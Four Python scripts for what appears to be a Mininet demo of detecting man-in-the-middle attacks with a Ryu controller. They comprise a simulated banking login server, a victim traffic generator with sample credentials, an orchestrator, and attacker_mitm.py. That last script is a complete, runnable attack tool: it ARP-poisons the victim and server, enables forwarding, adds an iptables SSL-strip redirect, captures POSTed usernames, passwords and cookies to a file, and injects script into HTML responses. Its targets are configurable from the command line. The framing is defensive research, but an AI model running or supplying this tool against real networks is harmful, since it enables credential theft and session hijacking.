```
# -*- coding: utf-8 -*-
"""
attacker_mitm.py
COMPLETE realistic MITM attack:
- ARP poisoning        (redirect traffic)
- IP forwarding        (stay invisible)
- HTTP interception    (steal credentials)
- SSL stripping        (downgrade HTTPS)
- Cookie stealing      (session hijack)
- Traffic injection    (modify responses)
- Bulk traffic gen     (generate realistic flow patterns)
"""

import os
import time
import sys
import threading
import re
from scapy.all import *

# ── Stage 0: Dynamic Configuration ─────────────────────
# Default values
VICTIM_IP  = "10.0.0.1"
SERVER_IP  = "10.0.0.2"
# In Mininet host namespace, the interface is usually 'eth0'
# In root namespace, it might be 'h3-eth0'
IFACE      = "eth0"
STOLEN     = "/tmp/mitm_stolen.txt"

# Override from command line if provided: python scripts/attacker_mitm.py [victim] [server] [iface]
if len(sys.argv) > 1:
    VICTIM_IP = sys.argv[1]
if len(sys.argv) > 2:
    SERVER_IP = sys.argv[2]
if len(sys.argv) > 3:
    IFACE = sys.argv[3]

# Auto-detect iface if specified one is not found
if IFACE not in [i[0] for i in get_if_list()]:
    print("⚠️  Warning: Interface '{}' not found. Falling back to default: '{}'".format(IFACE, conf.iface))
    IFACE = str(conf.iface)

# ── Stage 1: Enable IP forwarding ──────────────────────
# This allows the host to act as a router
os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")

# ── Stage 2: Enable iptables traffic forwarding ─────────
# This ensures that traffic is forwarded correctly and matches flow patterns
os.system("iptables -F")
os.system("iptables -t nat -F")
os.system("iptables -P FORWARD ACCEPT")

# ── Stage 3: SSL stripping via iptables ─────────────────
# Redirect HTTPS (443) to port 10000 (our sslstrip listener placeholder)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000")

# ── Stage 4: ARP Poison both sides ──────────────────────
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 iface=IFACE, timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def arp_poison_loop(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    my_mac     = get_if_hwaddr(IFACE)
    if not target_mac:
        print("Cannot find {}".format(target_ip))
        return
    
    # Building the ARP packet
    pkt = Ether(dst=target_mac)/ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=my_mac)
    
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(0.5)   # Fast poison loop

# ── Stage 5: Packet relay with modification ─────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return

    src = pkt[IP].src
    dst = pkt[IP].dst

    # Intercept HTTP credentials
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')

        # Steal POST credentials
        if 'POST' in payload and ('username' in payload or 'password' in payload):
            ts = time.strftime('%H:%M:%S')
            stolen_data = "[{}] CREDENTIALS STOLEN!\n  From: {}\n  To:   {}\n  Data: {}\n".format(
                ts, src, dst, payload[:300]
            )
            print("\n" + "🎯"*20)
            print(stolen_data)
            print("🎯"*20 + "\n")
            with open(STOLEN, 'a') as f:
                f.write(stolen_data)

        # Steal cookies
        if 'Cookie:' in payload:
            cookie = re.findall(r'Cookie: (.+)', payload)
            if cookie:
                ts = time.strftime('%H:%M:%S')
                line = "[{}] COOKIE STOLEN: {}\n".format(ts, cookie[0][:200])
                print("🍪 {}".format(line.strip()))
                with open(STOLEN, 'a') as f:
                    f.write(line)

        # Inject malicious content into HTTP responses
        if 'HTTP/1' in payload and 'text/html' in payload:
            # Add tracking pixel to every response
            modified = payload.replace(
                '</body>',
                '<script>document.title="HACKED by MITM"</script></body>'
            )
            
            # Update the packet with modified payload
            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
            
            # Recalculate checksums
            del pkt[IP].chksum
            del pkt[TCP].chksum
            
            # Re-send the modified packet
            # Note: With ip_forward=1, the original packet might also be forwarded by the kernel
            sendp(pkt, iface=IFACE, verbose=False)

# ── Stage 6: Generate bulk realistic traffic ─────────────
def generate_bulk_traffic():
    """Send repeated HTTP requests to build up flow stats for ML detection"""
    import socket
    while True:
        try:
            # Connect to server on port 8080 (assuming server_login.py is there)
            for _ in range(30):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
                    s.recv(1024)
                finally:
                    s.close()
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

# ── START ALL ATTACK STAGES ──────────────────────────────
print("="*50)
print("🔴 MITM ATTACK STARTING")
print("="*50)

# Thread 1: Poison victim
t1 = threading.Thread(target=arp_poison_loop,
                      args=(VICTIM_IP, SERVER_IP), daemon=True)
# Thread 2: Poison server
t2 = threading.Thread(target=arp_poison_loop,
                      args=(SERVER_IP, VICTIM_IP), daemon=True)
# Thread 3: Generate bulk traffic for ML detection
t3 = threading.Thread(target=generate_bulk_traffic, daemon=True)

t1.start()
t2.start()
time.sleep(2)   # Let ARP poison take effect first
t3.start()

print("✅ ARP Poisoning: active")
print("✅ IP Forwarding: active")
print("✅ Bulk traffic:  active (ML will fire in ~5 seconds)")
print("✅ Logging to:    {}".format(STOLEN))

# Sniff and process all intercepted traffic
sniff(filter="ip host {} or ip host {}".format(VICTIM_IP, SERVER_IP),
      prn=relay_and_intercept, iface=IFACE, store=False)

```
```
#!/usr/bin/env python3
"""
victim_traffic.py
Run this on the VICTIM host (h1).
Simulates a real user browsing a banking site repeatedly.
CRITICAL for generating enough traffic for ML detection.
"""

import requests
import time
import random
import sys
import os

# Ensure unbuffered output
sys.stdout.reconfigure(line_buffering=True)

# Configuration
SERVER_IP = "10.0.0.2"
SERVER_PORT = 8080
BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

SESSIONS = [
    {"user": "alice", "pass": "secret123"},
    {"user": "bob",   "pass": "password456"},
    {"user": "admin", "pass": "admin123"},
]

def log(msg):
    ts = time.strftime('%H:%M:%S')
    print(f"[{ts}] {msg}")

def run_user_session():
    session = requests.Session()
    user_creds = random.choice(SESSIONS)
    username = user_creds['user']
    
    try:
        # 1. Browse Homepage
        log(f"Victim browsing homepage as {username}...")
        resp = session.get(f"{BASE_URL}/", timeout=2)
        if resp.status_code != 200:
            log(f"⚠️  Error reaching server: {resp.status_code}")
            return

        time.sleep( random.uniform(0.5, 1.5))

        # 2. Login
        log(f"Sending POST /login user={username} pass={user_creds['pass']}")
        login_data = {'username': username, 'password': user_creds['pass']}
        resp = session.post(f"{BASE_URL}/login", data=login_data, timeout=2)
        
        if "Login Successful" in resp.text:
            log("✅ Login successful")
        else:
            log("❌ Login failed (maybe under attack?)")

        time.sleep(random.uniform(0.5, 1.5))

        # 3. View Dashboard
        log("Viewing dashboard...")
        session.get(f"{BASE_URL}/dashboard", timeout=2)

        # 4. Transfer Money (sometimes)
        if random.random() > 0.5:
            time.sleep(1)
            amount = random.randint(10, 500)
            log(f"Transferring ${amount}...")
            session.post(f"{BASE_URL}/transfer", data={'amount': amount, 'to': 'charity'}, timeout=2)

    except requests.exceptions.ConnectionError:
        log("❌ Connection Error: Server unreachable (Check if blocked?)")
    except requests.exceptions.Timeout:
        log("⚠️  Timeout: Server slow to respond")
    except Exception as e:
        log(f"❌ Error: {e}")

if __name__ == "__main__":
    print(f"Starting simulated victim traffic to {BASE_URL}...")
    print("Press Ctrl+C to stop.")
    print("-" * 40)
    
    # Wait for server to be ready
    time.sleep(2)
    
    while True:
        run_user_session()
        delay = random.uniform(2, 4)
        log(f"Sleeping {delay:.1f}s...")
        print("-" * 40)
        time.sleep(delay)

```
```
#!/usr/bin/env python3
"""
server_login.py
Run this on the SERVER host (h2).
Simulates a real banking login portal.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import time
import datetime
import os
import sys

# Ensure logs are visible immediately
sys.stdout.reconfigure(line_buffering=True)

SERVER_PORT = 8080
LOG_FILE = "/tmp/server_log.txt"

def log_event(msg):
    ts = datetime.datetime.now().strftime('%H:%M:%S')
    log_line = f"[{ts}] {msg}"
    print(log_line)
    with open(LOG_FILE, 'a') as f:
        f.write(log_line + "\n")

class BankHandler(BaseHTTPRequestHandler):
    def _send_html(self, content):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))

    def do_GET(self):
        client_ip = self.client_address[0]
        
        if self.path == '/':
            log_event(f"[HTTP] GET / from {client_ip}")
            html = """
            <html>
            <head><title>SecureBank Login</title></head>
            <body>
                <h1>Welcome to SecureBank</h1>
                <form method='POST' action='/login'>
                    Username: <input name='username'><br>
                    Password: <input name='password' type='password'><br>
                    <input type='submit' value='Login'>
                </form>
            </body>
            </html>
            """
            self._send_html(html)
            
        elif self.path == '/dashboard':
            log_event(f"[HTTP] GET /dashboard from {client_ip}")
            html = "<html><body><h1>Your Account Dashboard</h1><p>Balance: $10,000</p></body></html>"
            self._send_html(html)
            
        else:
            self.send_error(404)

    def do_POST(self):
        client_ip = self.client_address[0]
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(body)

        if self.path == '/login':
            user = params.get('username', ['?'])[0]
            pwd = params.get('password', ['?'])[0]
            log_event(f"[LOGIN] user={user} pass={pwd} | from={client_ip}")
            self._send_html("<html><body><h1>Login Successful!</h1><a href='/dashboard'>Go to Dashboard</a></body></html>")
            
        elif self.path == '/transfer':
            amount = params.get('amount', ['0'])[0]
            to_account = params.get('to', ['?'])[0]
            log_event(f"[TRANSFER] ${amount} to {to_account} | from={client_ip}")
            self._send_html("<html><body><h1>Transfer Complete!</h1></body></html>")
            
        else:
            self.send_error(404)
            
    def log_message(self, fmt, *args):
        # Suppress default logging to keep terminal clean
        pass

class BankServer(HTTPServer):
    allow_reuse_address = True

if __name__ == '__main__':
    # Clean previous log
    if os.path.exists(LOG_FILE):
        try:
            os.remove(LOG_FILE)
        except OSError:
            pass
        
    log_event("Attempting to start server...")
    
    try:
        server = BankServer(('0.0.0.0', SERVER_PORT), BankHandler)
        print(f"Server started on port {SERVER_PORT}...")
        log_event("Server started successfully.")
        server.serve_forever()
    except OSError as e:
        if e.errno == 98:
            print(f"❌ ERROR: Port {SERVER_PORT} is already in use.")
            print("Try killing the existing process with: fuser -k 8080/tcp")
            log_event(f"Error: Port {SERVER_PORT} in use.")
        else:
            print(f"❌ ERROR: {e}")
            log_event(f"Error: {e}")
    except KeyboardInterrupt:
        print("\nServer stopping...")
        if 'server' in locals():
            server.server_close()

```
```
#!/usr/bin/env python3
"""
run_demo.py — Complete MITM Detection Demo
Starts everything automatically in Mininet.

Usage: sudo python3 run_demo.py

What it does:
  1. Creates topology
  2. Starts Ryu controller (assumes already running)
  3. Starts server (login page)
  4. Starts victim (sends credentials)
  5. Starts attacker (MITM)
  6. Watches Ryu detect and block the attack
"""

from mininet.net import Mininet
from mininet.node import RemoteController, OVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel
import time
import os

def create_topology():
    net = Mininet(controller=RemoteController, switch=OVSSwitch)

    c0 = net.addController('c0', ip='127.0.0.1', port=6633)

    # Single Switch for 100% reliable demo connectivity
    s1 = net.addSwitch('s1', protocols='OpenFlow13')

    # All hosts on the same switch
    victim   = net.addHost('victim',   ip='10.0.0.1/24', mac='00:00:00:00:00:01')
    server   = net.addHost('server',   ip='10.0.0.2/24', mac='00:00:00:00:00:02')
    attacker = net.addHost('attacker', ip='10.0.0.100/24', mac='00:00:00:00:00:03')
    
    device1  = net.addHost('device1',  ip='10.0.0.11/24', mac='00:00:00:00:00:11')
    device2  = net.addHost('device2',  ip='10.0.0.12/24', mac='00:00:00:00:00:12')

    # Links
    net.addLink(victim,   s1)
    net.addLink(server,   s1)
    net.addLink(attacker, s1)
    net.addLink(device1,  s1)
    net.addLink(device2,  s1)

    return net

def run_demo():
    net = create_topology()
    net.start()

    victim   = net.get('victim')
    server   = net.get('server')
    attacker = net.get('attacker')
    device1  = net.get('device1')

    print("\n" + "="*60)
    print("🚀 MITM DETECTION DEMO STARTED")
    print("="*60)

    # ── Phase 1: Test connectivity ─────────────────────────
    print("\n📡 Phase 1: Testing network connectivity...")
    time.sleep(2) # Wait for Ryu to learn ports
    print("Pinging all hosts to warm up the controller...")
    net.pingAll()
    
    result = victim.cmd('ping -c 2 10.0.0.2')
    if "2 received" in result:
        print("✅ Victim can reach Server — network OK")
    else:
        print("⚠️  Connectivity issue — check Ryu controller logs")

    # ── Phase 2: Start server (login page) ────────────────
    print("\n🏦 Phase 2: Starting login server...")
    server.cmd('python3 /tmp/server_login.py &')
    time.sleep(2)
    print("✅ Login server running on 10.0.0.2:8080")

    # ── Phase 3: Generate normal traffic ──────────────────
    print("\n✅ Phase 3: Normal traffic (no attack)...")
    victim.cmd('curl -s http://10.0.0.2:8080/ > /dev/null &')
    victim.cmd('curl -s -X POST http://10.0.0.2:8080/login -d "username=alice&password=secret123" &')
    device1.cmd('ping -c 10 10.0.0.2 &')
    time.sleep(5)
    print("✅ Normal traffic generated — Ryu should show 'Normal' scores")

    # ── Phase 4: Launch MITM attack ────────────────────────
    print("\n🔴 Phase 4: Launching REAL MITM Attack...")
    print("   Step 1: Enabling IP forwarding on attacker...")
    attacker.cmd('sysctl -w net.ipv4.ip_forward=1')

    print("   Step 2: ARP poisoning victim and server...")
    attacker.cmd('python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2 &')
    time.sleep(3)
    print("✅ Attack launched! Traffic now flows through attacker")

    # ── Phase 5: Victim sends credentials (gets stolen!) ──
    print("\n💀 Phase 5: Victim sending credentials (being stolen!)...")
    victim.cmd('python3 /tmp/victim_traffic.py 10.0.0.2 &')
    time.sleep(5)

    # ── Phase 6: Check stolen credentials ─────────────────
    print("\n🔍 Phase 6: Checking attacker's stolen data...")
    stolen = attacker.cmd('cat /tmp/mitm_stolen.txt 2>/dev/null || echo "No file yet"')
    if "username" in stolen or "password" in stolen:
        print("🚨 CREDENTIALS STOLEN BY ATTACKER:")
        print(stolen[:300])
    else:
        print("⏳ Attack in progress... check attacker terminal")

    # ── Phase 7: Verify detection ─────────────────────────
    print("\n🛡️  Phase 7: Verifying detection...")
    print("   → Check Ryu controller terminal for:")
    print("     🚨 [RULE] ARP SPOOF DETECTED!")
    print("     🚨 [ML]   MITM DETECTED!")
    print("     🔒 Blocked MAC/IP of attacker")

    print("\n" + "="*60)
    print("📊 DEMO COMPLETE — Opening interactive CLI")
    print("   Useful CLI commands:")
    print("   victim arp -n          → see poisoned ARP table")
    print("   attacker cat /tmp/mitm_stolen.txt  → stolen creds")
    print("   server  cat /tmp/server_log.txt    → server logs")
    print("="*60 + "\n")

    CLI(net)
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    run_demo()

```